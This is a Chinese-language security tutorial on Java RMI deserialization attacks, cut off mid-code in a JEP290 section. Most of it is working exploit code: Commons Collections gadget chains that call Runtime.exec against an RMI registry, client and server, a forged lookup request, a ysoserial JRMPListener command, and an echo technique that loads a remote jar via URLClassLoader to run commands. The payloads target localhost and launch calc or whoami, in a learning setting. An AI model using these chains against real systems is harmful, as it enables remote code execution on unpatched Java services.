# 前言

之前学习了rmi和rmi的反序列化，但是最近看到对于rmi的反序列化的了解确实太少了，于是再去深入学习了一下rmi的反序列化，作为一篇较为全面的文章，还是从头开始写起

# 什么是RMI

RMI（Remote Method Invocation）是远程方法调用的简称，能够查找并执行远程对象的方法，简单地来说，就是将一个class对象放在A上，再实现A与B的通信，最后在B上调用A的方法

RMI允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中

从C/S模型来看，客户端与服务端的通信是通过JRMP协议的

在RMI中对象是通过序列化方式进行编码传输的

RMI分为三个主体部分：

- Client-客户端：客户端调用服务端的方法
- Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果
- Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用，在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Server与Registry只能在一台服务器上，否则无法注册成功

RMI服务端提供的方法，被调用的时候该方法是执行在服务端

总而言之，实现的效果就是调用远程的一个类，仿佛这个类写在自己本地一样

# RMI通信实现

远程接口

```
package cn.DawnT0wn.RMI;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface ServiceInterface extends Remote {
    public String sayHello(String name) throws RemoteException;
}
```

这个接口需要

- 使用public声明，否则客户端在尝试加载实现远程接口的远程对象时会出错。（如果客户端、服务端放一起没关系）
- 同时需要继承Remote类
- 接口的方法需要声明java.rmi.RemoteException报错
- 服务端实现这个远程接口

接口实现类

```
package cn.DawnT0wn.RMI;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class ServiceInterfaceImpl extends UnicastRemoteObject implements ServiceInterface {

    protected ServiceInterfaceImpl() throws RemoteException {
        super();
    }

    public String sayHello(String name) throws RemoteException{
        return "Hello " + name +"!";
    }

}
```

实现类需要

- 实现远程接口
- 继承UnicastRemoteObject类，继承了之后会使用默认socket进行通讯，并且该实现类会一直运行在服务器上（如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法）
- 构造函数需要抛出一个RemoteException错误
- 实现类中使用的对象必须都可序列化，即都继承java.io.Serializable
- 注册远程对象

服务端

```
package cn.DawnT0wn.RMI;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMIService {
    public static void main(String[] args) throws Exception {

        //创建远程对象
        ServiceInterface rs = new ServiceInterfaceImpl();
        //创建接收5001端口请求的Registry实例
        //注册远程对象
        LocateRegistry.createRegistry(5001);
        //将远程接口实现类ServiceInterfaceImpl()的对象绑定到Hello上，等待远程调用
        Naming.bind("rmi://127.0.0.1:5001/Hello",rs);//如果是默认的1099端口就可以不加端口号
    }
}
```

这里我绑定的时候用的bind方法

在文章中师傅也用到了rebind，还有提到了关于rmi格式的问题

绑定的地址很多地方会rmi://ip:port/Objectname的形式，但是RMI:写不写都行，port如果默认是1099，不写会自动补上，其他端口必须写

客户端

```
package cn.DawnT0wn.RMI;

import java.rmi.Naming;

public class RMIClient {
    public static void main(String[] args) throws Exception {
        //从远程获取名为Hello的远程接口实现类
        ServiceInterface rc = (ServiceInterface)Naming.lookup("rmi://127.0.0.1:5001/Hello");
        //调用它的sayHello方法并传值
        String say = rc.sayHello("DawnT0wn");
        System.out.println(say);
    }
}
```

启动服务端再运行客户端就可以实现RMI的远程方法调用

# RMI反序列化

前面提到了RMI中，对象是通过序列化流传输的，那有序列化就会存在反序列化，那如果有对应的反序列化链可能就能够造成攻击

之前的学习只学习到了攻击服务端，但是除了攻击服务端还可以攻击注册中心和客户端

## 攻击注册中心

在使用 Registry 时，首先由 Server 端向 Registry 端绑定服务对象，这个对象是一个 Server 端生成的动态代理类，Registry 端会反序列化这个类并存在自己的 RegistryImpl 的 bindings 中，以供后续的查询。所以如果我们是一个恶意的 Server 端，向 Registry 端输送了一个恶意的对象，在其反序列化时就可以触发恶意调用

理论上来看，客户端和服务端都是可以对注册中心发起攻击的

既然是反序列化，那就需要去寻找反序列化点，又是在RMI进行通讯的过程中，我们需要了解与各个对象交互的函数，先看与注册中心交互的几种方式

- list
- bind
- rebind
- unbind
- lookup

这几种方法位于RegistryImpl_Skel#dispatch中，如果存在readObject，则可以利用

这个dispatch是一个Switch语句，看师傅的博客写了对应方式

- 0->bind
- 1->list
- 2->lookup
- 3->rebind
- 4->unbind

```
case 0:
    try {
        var11 = var2.getInputStream();
        var7 = (String)var11.readObject();
        var8 = (Remote)var11.readObject();
    } catch (IOException var94) {
        throw new UnmarshalException("error unmarshalling arguments", var94);
    } catch (ClassNotFoundException var95) {
        throw new UnmarshalException("error unmarshalling arguments", var95);
    } finally {
        var2.releaseInputStream();
    }

    var6.bind(var7, var8);

    try {
        var2.getResultStream(true);
        break;
    } catch (IOException var93) {
        throw new MarshalException("error marshalling return", var93);
    }
case 1:
    var2.releaseInputStream();
    String[] var97 = var6.list();

    try {
        ObjectOutput var98 = var2.getResultStream(true);
        var98.writeObject(var97);
        break;
    } catch (IOException var92) {
        throw new MarshalException("error marshalling return", var92);
    }
case 2:
    try {
        var10 = var2.getInputStream();
        var7 = (String)var10.readObject();
    } catch (IOException var89) {
        throw new UnmarshalException("error unmarshalling arguments", var89);
    } catch (ClassNotFoundException var90) {
        throw new UnmarshalException("error unmarshalling arguments", var90);
    } finally {
        var2.releaseInputStream();
    }

    var8 = var6.lookup(var7);

    try {
        ObjectOutput var9 = var2.getResultStream(true);
        var9.writeObject(var8);
        break;
    } catch (IOException var88) {
        throw new MarshalException("error marshalling return", var88);
    }
case 3:
    try {
        var11 = var2.getInputStream();
        var7 = (String)var11.readObject();
        var8 = (Remote)var11.readObject();
    } catch (IOException var85) {
        throw new UnmarshalException("error unmarshalling arguments", var85);
    } catch (ClassNotFoundException var86) {
        throw new UnmarshalException("error unmarshalling arguments", var86);
    } finally {
        var2.releaseInputStream();
    }

    var6.rebind(var7, var8);

    try {
        var2.getResultStream(true);
        break;
    } catch (IOException var84) {
        throw new MarshalException("error marshalling return", var84);
    }
case 4:
    try {
        var10 = var2.getInputStream();
        var7 = (String)var10.readObject();
    } catch (IOException var81) {
        throw new UnmarshalException("error unmarshalling arguments", var81);
    } catch (ClassNotFoundException var82) {
        throw new UnmarshalException("error unmarshalling arguments", var82);
    } finally {
        var2.releaseInputStream();
    }

    var6.unbind(var7);

    try {
        var2.getResultStream(true);
        break;
    } catch (IOException var80) {
        throw new MarshalException("error marshalling return", var80);
    }
```

从代码来看，除了list方法，都存在一个readObject来反序列化

但是又存在一定的差异

### bind和rebind

```
case 0:
    try {
        var11 = var2.getInputStream();
        var7 = (String)var11.readObject();
        var8 = (Remote)var11.readObject();
    } catch (IOException var94) {
        throw new UnmarshalException("error unmarshalling arguments", var94);
    } catch (ClassNotFoundException var95) {
        throw new UnmarshalException("error unmarshalling arguments", var95);
    } finally {
        var2.releaseInputStream();
    }

    var6.bind(var7, var8);

    try {
        var2.getResultStream(true);
        break;
    } catch (IOException var93) {
        throw new MarshalException("error marshalling return", var93);
    }

case 3:
    try {
        var11 = var2.getInputStream();
        var7 = (String)var11.readObject();
        var8 = (Remote)var11.readObject();
    } catch (IOException var85) {
        throw new UnmarshalException("error unmarshalling arguments", var85);
    } catch (ClassNotFoundException var86) {
        throw new UnmarshalException("error unmarshalling arguments", var86);
    } finally {
        var2.releaseInputStream();
    }

        var6.rebind(var7, var8);

    try {
        var2.getResultStream(true);
        break;
    } catch (IOException var84) {
        throw new MarshalException("error marshalling return", var84);
    }
```

bind和rebind可以传入一个remote对象，进行反序列化

服务端代码

```
package RMIunser;

import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.server.UnicastRemoteObject;

public class Server {

    public interface User extends Remote {
        public String name(String name) throws RemoteException;
        public void say(String say) throws RemoteException;
    }

    public static class UserImpl extends UnicastRemoteObject implements User{

        protected UserImpl() throws RemoteException{
            super();
        }
        public String name(String name) throws RemoteException{
            return name;
        }
        public void say(String say) throws  RemoteException{
            System.out.println("you speak" + say);
        }
    }

    public static void main(String[] args) throws Exception{
        String url = "rmi://127.0.0.1:1099/User";
        UserImpl user = new UserImpl();
        LocateRegistry.createRegistry(1099);
        Naming.bind(url,user);
        System.out.println("RMI server is running");
    }
}
```

客户端

```
package RMIunser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import java.util.HashMap;
import java.util.Map;


public class Client1 {

    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);
        HashMap innermap = new HashMap();
        Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
        Constructor[] constructors = clazz.getDeclaredConstructors();
        Constructor constructor = constructors[0];
        constructor.setAccessible(true);
        Map map = (Map)constructor.newInstance(innermap,chain);


        Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        handler_constructor.setAccessible(true);
        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler

        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象


        Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandler_Constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);

        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
        Remote r = (Remote) Proxy.newProxyInstance(
                Remote.class.getClassLoader(),
                new Class[] { Remote.class }, handler);
        registry.bind("test",r);

    }
}
```

这里因为 bind 的参数是需要是 Remote 类型，不能直接传入一个InvocationHandler，所以这里用代理的方式进行了一个封装，网上看到的大多数是用Remote.class.cast进行一个强制类型转换

当r被反序列化的时候，handler也会被反序列化，自然可以执行后面的链子

![image-20220411174802169](images/1.png)

### unbind&lookup

```
case 2:
    try {
        var10 = var2.getInputStream();
        var7 = (String)var10.readObject();
    } catch (IOException var89) {
        throw new UnmarshalException("error unmarshalling arguments", var89);
    } catch (ClassNotFoundException var90) {
        throw new UnmarshalException("error unmarshalling arguments", var90);
    } finally {
        var2.releaseInputStream();
    }

    var8 = var6.lookup(var7);

    try {
        ObjectOutput var9 = var2.getResultStream(true);
        var9.writeObject(var8);
        break;
    } catch (IOException var88) {
        throw new MarshalException("error marshalling return", var88);
    }
    case 4:
                try {
                    var10 = var2.getInputStream();
                    var7 = (String)var10.readObject();
                } catch (IOException var81) {
                    throw new UnmarshalException("error unmarshalling arguments", var81);
                } catch (ClassNotFoundException var82) {
                    throw new UnmarshalException("error unmarshalling arguments", var82);
                } finally {
                    var2.releaseInputStream();
                }

                var6.unbind(var7);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var80) {
                    throw new MarshalException("error marshalling return", var80);
                }
            default:
                throw new UnmarshalException("invalid method number");
            }

        }
```

这两个和bind有一定的区别，这只能传入一个String

但是也并不是不能利用，参考了一些文章给出了两种方案

- 伪造连接请求
- rasp hook请求代码，修改发送数据

大多数都是用的第一种，利用反射来修改一些参数，师傅们跟据原先的Registry_Stub#lookup的请求过程来伪造了应该lookup请求，然后将构造好的链子传入

Registry_Stub#lookup

```
public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException {
    try {
        RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L);

        try {
            ObjectOutput var3 = var2.getOutputStream();
            var3.writeObject(var1);
        } catch (IOException var18) {
            throw new MarshalException("error marshalling arguments", var18);
        }

        super.ref.invoke(var2);

        Remote var23;
        try {
            ObjectInput var6 = var2.getInputStream();
            var23 = (Remote)var6.readObject();
        } catch (IOException var15) {
            throw new UnmarshalException("error unmarshalling return", var15);
        } catch (ClassNotFoundException var16) {
            throw new UnmarshalException("error unmarshalling return", var16);
        } finally {
            super.ref.done(var2);
        }

        return var23;
    } catch (RuntimeException var19) {
        throw var19;
    } catch (RemoteException var20) {
        throw var20;
    } catch (NotBoundException var21) {
        throw var21;
    } catch (Exception var22) {
        throw new UnexpectedException("undeclared checked exception", var22);
    }
}
```

POC

```
package RMIunser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import sun.rmi.server.UnicastRef;

import java.io.ObjectOutput;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;
import java.util.HashMap;
import java.util.Map;


public class Client2 {

    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);
        HashMap innermap = new HashMap();
        Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
        Constructor[] constructors = clazz.getDeclaredConstructors();
        Constructor constructor = constructors[0];
        constructor.setAccessible(true);
        Map map = (Map)constructor.newInstance(innermap,chain);


        Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        handler_constructor.setAccessible(true);
        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler

        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象


        Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandler_Constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);

        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
        Remote r = Remote.class.cast(Proxy.newProxyInstance(
                Remote.class.getClassLoader(),
                new Class[] { Remote.class }, handler));
        // 获取ref
        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();
        fields_0[0].setAccessible(true);
        UnicastRef ref = (UnicastRef) fields_0[0].get(registry);

        //获取operations

        Field[] fields_1 = registry.getClass().getDeclaredFields();
        fields_1[0].setAccessible(true);
        Operation[] operations = (Operation[]) fields_1[0].get(registry);

        // 伪造lookup的代码，去伪造传输信息
        RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
        ObjectOutput var3 = var2.getOutputStream();
        var3.writeObject(r);
        ref.invoke(var2);
    }
}

```

看似并没有使用lookup方法，实则是通过伪造了应该lookup请求，重要的并不是lookup方法，主要是通过这个传输信息，最近进入到之前提到的dispatch对应的分支进行反序列化

![image-20220411212810121](images/2.png)

## 攻击客户端

### 注册中心攻击客户端

还是从这几个函数出发

- bind
- unbind
- rebind
- list
- lookup

除了unbind和rebind，其他的都会返回数据给客户端，此时的数据是序列化的数据，所以客户端自然也会反序列化，那么我们只需要伪造注册中心的返回数据，就可以达到攻击客户端的效果啦

```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections1 calc
```

![image-20220411221815169](images/3.png)

但是调用unbind也会触发反序列化，实际上这五种方法都可以达到注册中心反打客户端或服务端的目的

```
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Client2 {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",12345);
        registry.unbind("test");
    }
}
```

![image-20220411222259223](images/4.png)

### 服务端攻击客户端

服务端攻击客户端，可以分为以下两种情景。

- 服务端返回参数为Object对象
- 远程加载对象

当服务端返回一个Object对象给客户端的时候，客户端会对这个Object对象反序列化，当远程调用某个方法的时候，返回的是一个Object对象

接口

```
package RMIunser;

import java.rmi.Remote;

public interface User extends Remote {
    public Object getUser() throws Exception;
}
```

实现类（在这里面重写getUser）

```
package RMIunser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.HashMap;
import java.util.Map;

public class LocalUser extends UnicastRemoteObject implements User  {

    public LocalUser() throws RemoteException {
        super();
    }

    public Object getUser() throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer chain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        innermap.put("value", "key");
        Map outmap = TransformedMap.decorate(innermap, null, chain);

        Class T0WN = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = T0WN.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object instance = constructor.newInstance(Retention.class, outmap);

        return instance;
    }
}
```

服务端

```
package RMIunser;

import java.rmi.AlreadyBoundException;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.concurrent.CountDownLatch;

public class Server {

    public static void main(String[] args) throws RemoteException, AlreadyBoundException, InterruptedException, NotBoundException {
        User T0WN = new LocalUser();
        Registry registry = LocateRegistry.createRegistry(1099);
        registry.bind("user",T0WN);
        System.out.println("registry is running...");
        System.out.println("liming is bind in registry");
        CountDownLatch latch=new CountDownLatch(1);
        latch.await();
    }

}
```

客户端

```
import RMIunser.User;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


public class Client {

    public static void main(String[] args) throws Exception {

        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
        User user = (User) registry.lookup("user");
        user.getUser();
    }
}
```

总的来说就是调用远程方法的结果返回了一个Object对象，然后返回到客户端的时候进行反序列化

![image-20220411225638587](images/5.png)

这种就要求客户端也要具有对应的Gadget

### 加载远程对象

现实中基本上遇不到

当服务端的某个方法返回的对象是客户端没有的时，客户端可以指定一个URL，此时会通过URL来实例化对象

参考https://paper.seebug.org/1091/#serverrmi-server

就没有再复现这个了

`java.security.policy`这个默认是没有配置的，需要我们手动去配置

## 攻击服务端

和攻击客户端一样，只要明白了RMI的交互过程就行，这里有一点区别，攻击客户端的时候是服务端返回了一个Object对象，即一个Object类型的方法

但是攻击服务端的时候，就需要客户端去返回一个Object对象，所以这时候要求服务端的函数接受一个Object类型的参数，只要将这个Object传给客户端就可以了

服务端

```
package RMIunser;

import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.server.UnicastRemoteObject;

public class Server {

    public interface User extends Remote {
        public String name(String name) throws RemoteException;
        public void say(String say) throws RemoteException;
        public void Example(Object work) throws RemoteException;
    }

    public static class UserImpl extends UnicastRemoteObject implements User{

        public UserImpl() throws RemoteException{
            super();
        }
        public String name(String name) throws RemoteException{
            return name;
        }
        public void say(String say) throws  RemoteException{
            System.out.println("you speak" + say);
        }
        public void Example(Object example) throws  RemoteException{
            System.out.println("This is " + example);
        }
    }

    public static void main(String[] args) throws Exception{
        String url = "rmi://127.0.0.1:1099/User";
        UserImpl user = new UserImpl();
        LocateRegistry.createRegistry(1099);
        Naming.bind(url,user);
        System.out.println("RMI server is running");
    }
}
```

客户端

```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.rmi.Naming;
import java.util.HashMap;
import java.util.Map;
import RMIunser.Server.User;

public class Client {
    public static void main(String[] args) throws Exception{
        String url = "rmi://127.0.0.1:1099/User";
        User userClient = (User)Naming.lookup(url);

        System.out.println(userClient.name("lala"));
        userClient.say("world");
        userClient.Example(getpayload());
    }
    public static Object getpayload() throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer chain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        innermap.put("value", "key");
        Map outmap = TransformedMap.decorate(innermap, null, chain);

        Class T0WN = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = T0WN.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object instance = constructor.newInstance(Retention.class, outmap);

        return instance;
    }
}
```

![image-20220411231212043](images/6.png)

关于远程加载对象的攻击手法还是很苛刻，也不再提了

这么多攻击方式可以看到，主要还是RMI通信的时候通过序列化流进行传输，然后通过一些函数进行反序列化，主要是建立RMI通信，其他的理解其实并不难，大多数的时候遇到的攻击基本上都是在客户端和服务端之间的

# 攻击回显

这里指的是在攻击注册中心的回显，在之前的复现过程中可以看到，在攻击注册中心的时候，注册中心会将异常发给客户端，这里使用了URLClassLoader加载了远程的jar，传给服务端，反序列化调用其方法，在方法内抛出错误返回给客户端

服务端

```
package RMIunser;

import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.server.UnicastRemoteObject;

public class Server {

    public interface User extends Remote {
        public String name(String name) throws RemoteException;
        public void say(String say) throws RemoteException;
        public void Example(Object work) throws RemoteException;
    }

    public static class UserImpl extends UnicastRemoteObject implements User{

        public UserImpl() throws RemoteException{
            super();
        }
        public String name(String name) throws RemoteException{
            return name;
        }
        public void say(String say) throws  RemoteException{
            System.out.println("you speak" + say);
        }
        public void Example(Object example) throws  RemoteException{
            System.out.println("This is " + example);
        }
    }

    public static void main(String[] args) throws Exception{
        String url = "rmi://127.0.0.1:1099/User";
        UserImpl user = new UserImpl();
        LocateRegistry.createRegistry(1099);
        Naming.bind(url,user);
        System.out.println("RMI server is running");
    }
}
```

ErrorBaseExec

```
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class ErrorBaseExec {

    public static void do_exec(String args) throws Exception
    {
        Process proc = Runtime.getRuntime().exec(args);
        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        StringBuffer sb = new StringBuffer();
        String line;
        while ((line = br.readLine()) != null)
        {
            sb.append(line).append("\n");
        }
        String result = sb.toString();
        Exception e=new Exception(result);
        throw e;
    }
}
```

编译成RMIexploit.jar

```
javac ErrorBaseExec.java
jar -cvf RMIexploit.jar ErrorBaseExec.class
```

客户端

```
package RMIunser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import java.util.HashMap;
import java.util.Map;


public class Client {
    public static Constructor<?> getFirstCtor(final String name)
            throws Exception {
        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
        ctor.setAccessible(true);

        return ctor;
    }

    public static void main(String[] args) throws Exception {
        String ip = "127.0.0.1"; //注册中心ip
        int port = 1099; //注册中心端口
        String remotejar = "http://127.0.0.1:8081/RMIexploit.jar";
        String command = "whoami";
        final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

        try {
            final Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(java.net.URLClassLoader.class),
                    new InvokerTransformer("getConstructor", new Class[] { Class[].class }, new Object[] { new Class[] { java.net.URL[].class } }),
                    new InvokerTransformer("newInstance", new Class[] { Object[].class }, new Object[] {new Object[] {new java.net.URL[] { new java.net.URL(remotejar) }}}),
                    new InvokerTransformer("loadClass", new Class[] { String.class }, new Object[] {"ErrorBaseExec"}),
                    new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "do_exec", new Class[] { String.class } }),
                    new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new String[] { command } })
            };
            Transformer transformedChain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            innerMap.put("value", "value");

            Map outerMap = TransformedMap.decorate(innerMap, null,
                    transformedChain);
            Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
            ctor.setAccessible(true);

            Object instance = ctor.newInstance(Target.class, outerMap);
            Registry registry = LocateRegistry.getRegistry(ip, port);
            InvocationHandler h = (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Target.class, outerMap);
            Remote r = Remote.class.cast(Proxy.newProxyInstance(
                    Remote.class.getClassLoader(),
                    new Class[] { Remote.class }, h));
            registry.bind("liming", r);
        } catch (Exception e) {
            try {
                System.out.print(e.getCause().getCause().getCause().getMessage());
            } catch (Exception ee) {
                throw e;
            }
        }
    }
}
```

用python起一个简易的http服务器

```
py -3 -m http.server 8081
```

loadclass那里要注意包名

![image-20220412224741012](images/7.png)

拿到返回结果

我想在vps上试的时候报错了，说bind disallowed，就没有再试了

# 什么是JEP290

JEP290是Java底层为了缓解反序列化攻击提出的一种解决方案，主要做了以下几件事

- 提供一个限制反序列化类的机制，白名单或者黑名单。
- 限制反序列化的深度和复杂度。
- 为RMI远程调用对象提供了一个验证类的机制。
- 定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器

JEP290是java为反序列化设置的一种filter，目的是只反序列化特定的内容，让CC链一类的例如Transformer，Hashmap这些类无法反序列化来达到一种防御反序列化漏洞的作用

JEP290本身是JDK9的产物，但是Oracle官方做了向下移植的处理，把JEP290的机制移植到了以下三个版本以及其修复后的版本中：

- Java? SE Development Kit 8, Update 121 (JDK 8u121)
- Java? SE Development Kit 7, Update 131 (JDK 7u131)
- Java? SE Development Kit 6, Update 141 (JDK 6u141)

JEP290中对RMI设置了默认的过滤器（sun.rmi.registry.RegistryImpl#registryFilter）

```
private static Status registryFilter(FilterInfo var0) {
    if (registryFilter != null) {
        Status var1 = registryFilter.checkInput(var0);
        if (var1 != Status.UNDECIDED) {
            return var1;
        }
    }

    if (var0.depth() > 20L) {
        return Status.REJECTED;
    } else {
        Class var2 = var0.serialClass();
        if (var2 != null) {
            if (!var2.isArray()) {
                return String.class != var2 && !Number.class.isAssignableFrom(var2) && !Remote.class.isAssignableFrom(var2) && !Proxy.class.isAssignableFrom(var2) && !UnicastRef.class.isAssignableFrom(var2) && !RMIClientSocketFactory.class.isAssignableFrom(var2) && !RMIServerSocketFactory.class.isAssignableFrom(var2) && !ActivationID.class.isAssignableFrom(var2) && !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;
            } else {
                return var0.arrayLength() >= 0L && var0.arrayLength() > 1000000L ? Status.REJECTED : Status.UNDECIDED;
            }
        } else {
            return Status.UNDECIDED;
        }
    }
}
```

这个过滤器设置了白名单，他会判断你要反序列化的类（或者反序列化类的父类）是否在以下列表中（仅用于RmiRegistry）：

```
String.class
Remote.class
Proxy.class
UnicastRef.class
RMIClientSocketFactory.class
RMIServerSocketFactory.class
ActivationID.class
UID.class
```

如果不在，则会标记为REJECTED，此时不会反序列化成功，反之则标记为ALLOWED，此时则可以反序列化成功

在https://paper.seebug.org/1251/#bypass-jep290-rmi中提到了，JEP290的机制主要是在调用readObject进行反序列化的过程中，新增了一个`filterCheck`方法，所以，任何反序列化操作都会经过这个`filterCheck`方法，利用`checkInput`方法来对序列化数据进行检测，如果有任何不合格的检测，`Filter`将返回`REJECTED`。但是`jep290`的`filter`需要手动设置，通过`setObjectInputFilter`来设置`filter`，如果没有设置，还是不会有白名单

具体的过程https://paper.seebug.org/1689/

接口类

```
package RMIunser;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface Hello extends Remote {
    String hello() throws RemoteException;
    String hello(String name) throws RemoteException;
